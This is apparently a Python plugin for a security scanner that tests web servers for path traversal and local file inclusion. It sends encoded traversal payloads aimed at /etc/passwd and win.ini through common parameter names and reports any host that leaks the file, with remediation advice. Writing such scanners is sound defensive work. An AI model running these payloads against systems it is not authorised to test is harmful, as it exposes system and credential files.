from __future__ import annotations

import logging
from typing import TYPE_CHECKING

import httpx

from scanr.core.plugin_base import FindingData, PluginBase, PluginCategory, Severity
from scanr.plugins.web._ports import is_web_port, web_scheme
from scanr.plugins.web._crawler import crawl

if TYPE_CHECKING:
    from scanr.core.context import ScanContext
    from scanr.models import Host

logger = logging.getLogger(__name__)

HTTP_PORTS = [80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
]

UNIX_SIGNATURE = "root:x:0:0"
WINDOWS_SIGNATURE = "[fonts]"

# File-inclusion param names commonly used across frameworks
_LFI_PARAMS = [
    "file", "path", "page", "include", "doc", "document",
    "template", "load", "plugin", "module", "view", "lang",
    "layout", "tpl", "theme", "src", "content",
]


class PathTraversalPlugin(PluginBase):
    id = "web.path_traversal"
    name = "Path Traversal / LFI"
    description = "Test for path traversal and local file inclusion vulnerabilities"
    category = PluginCategory.web
    severity = Severity.high
    ports = HTTP_PORTS

    async def check(self, context: "ScanContext", host: "Host") -> list[FindingData]:
        findings = []
        for port in host.ports:
            if not is_web_port(port):
                continue
            scheme = web_scheme(port)
            finding = await self._test(host.ip, port.number, scheme)
            if finding:
                findings.append(finding)
        return findings

    async def _test(self, ip: str, port: int, scheme: str) -> FindingData | None:
        base_url = f"{scheme}://{ip}:{port}"
        try:
            async with httpx.AsyncClient(verify=False, timeout=httpx.Timeout(3.0, connect=2.0), follow_redirects=True) as client:
                crawled = await crawl(base_url, client)
                paths = crawled.paths or ["/"]
                params = list(dict.fromkeys(crawled.get_params + _LFI_PARAMS))

                for payload in TRAVERSAL_PAYLOADS:
                    for path in paths:
                        for param in params:
                            url = f"{base_url}{path}?{param}={payload}"
                            try:
                                resp = await client.get(url)
                                body = resp.text
                                if UNIX_SIGNATURE in body:
                                    return FindingData(
                                        plugin_id=self.id,
                                        severity=Severity.high,
                                        title="Path Traversal — /etc/passwd Readable",
                                        description=(
                                            f"The '{param}' parameter at {path} allows reading arbitrary files. "
                                            "An attacker can read sensitive configuration and credential files."
                                        ),
                                        evidence=f"GET {url} → contains '{UNIX_SIGNATURE}'",
                                        remediation=(
                                            "Validate and sanitize all file path inputs. Use an allowlist of permitted "
                                            "files. Do not pass user input directly to filesystem functions."
                                        ),
                                        references=[
                                            "https://owasp.org/www-community/attacks/Path_Traversal",
                                            "https://cwe.mitre.org/data/definitions/22.html",
                                        ],
                                        port_number=port,
                                        protocol="tcp",
                                    )
                                if WINDOWS_SIGNATURE in body:
                                    return FindingData(
                                        plugin_id=self.id,
                                        severity=Severity.high,
                                        title="Path Traversal — win.ini Readable",
                                        description=(
                                            f"The '{param}' parameter at {path} allows reading arbitrary files. "
                                            "Windows system files are accessible."
                                        ),
                                        evidence=f"GET {url} → contains '{WINDOWS_SIGNATURE}'",
                                        remediation=(
                                            "Validate and sanitize all file path inputs. Use an allowlist of permitted "
                                            "files. Do not pass user input directly to filesystem functions."
                                        ),
                                        references=["https://owasp.org/www-community/attacks/Path_Traversal"],
                                        port_number=port,
                                        protocol="tcp",
                                    )
                            except Exception:
                                continue
        except Exception:
            pass
        return None
